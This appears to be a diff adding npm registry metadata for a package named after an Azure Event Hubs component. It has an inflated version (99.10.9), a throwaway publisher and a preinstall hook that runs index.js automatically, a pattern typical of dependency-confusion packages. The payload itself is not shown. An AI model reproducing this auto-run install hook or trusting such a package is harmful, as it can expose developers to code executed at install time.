@@ -1,0 +1,62 @@
+{
+    "_id": "eventhubs-checkpointstore-table",
+    "name": "eventhubs-checkpointstore-table",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "eventhubs-checkpointstore-table",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "eventhubs-checkpointstore-table@99.10.9",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-/YtbbrvosCtvm52IeKSoZpn7lp3IeWyqrZzpZS35dR31cZ9hQrnX+mBqzJmfHOroyrNHHUgqo30hN0MJ6dVkYg==",
+                "shasum": "20ea30828dfdd6810812cc8a21eafe23d3b769aa",
+                "tarball": "https://registry.npmjs.org/eventhubs-checkpointstore-table/-/eventhubs-checkpointstore-table-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5080,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNc31ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrCFA/7B1wRzEgBUAwwdvBzrw77620u/ZnJsf6zgWA4cCRfAkBpMlD5\r\nhM/JSq4niW7fQdZHHX6tVtNVxUNfJ34skatoABbjZ95TJqe7khR1DJzXNkt8\r\noim8kw45LtB4ARnYrCSeg2PXy/+4XPBWBjfzS8ZNdDZuCP5uPNzclSiaJZLf\r\nyBjUOf7h6FcR1mk24qfZbl9l5h+sy+oen7T/bINoEOnVVKRur94E7SyIYzmX\r\nO+3zdmYtOhqiQ7y0SRCDQvCtTNV7843ZwdSqUpYMOD75XRFrcMnf+YHtZ5fG\r\nRPtv/KcQItUPYk4CugFnzHEnAhh+gg7PxrTGTqkidldcF59iQ6S+zIgDE/Bj\r\n4FXB/SkB/W2kUDO0OyBI7D6M8A5m49Fo3q0EUTRMpCPSqNC6fPnak2JOV0JE\r\nytPIiN+D2owec7eCoAvJNnsp9O9buSm9ZKWFUGHfgDZc9VNQtL4XJI0CEyVA\r\nq4adyRpkUl85qW2Bwf0CE0DzvAXVsLWEr3J4cSa4rN9/hZUvEaFfSd1xn8Hw\r\nv/cUmjnKhSc7hCfFgHmHC6f9iZyRF1HYcvPEZwHZ1BNJD1vtbw1fvI1CqAKP\r\n2dd/sNTniZaUNNLyzaghBix0y7Hd2gUGdFKylTlLn5oqdLb8T8PSFpaPDGmA\r\naGG8tTA1O90q8ajHT26ZChnB6tdYGdpd0D4=\r\n=RV+Q\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "q5pf2pn9",
+                "email": "q5pf2pn9@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "q5pf2pn9",
+                    "email": "q5pf2pn9@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/eventhubs-checkpointstore-table_99.10.9_1647693301331_0.13362097850494958"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-19T12:35:01.331Z",
+        "99.10.9": "2022-03-19T12:35:01.505Z",
+        "modified": "2022-03-19T12:35:01.604Z"
+    },
+    "maintainers": [
+        {
+            "name": "q5pf2pn9",
+            "email": "q5pf2pn9@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
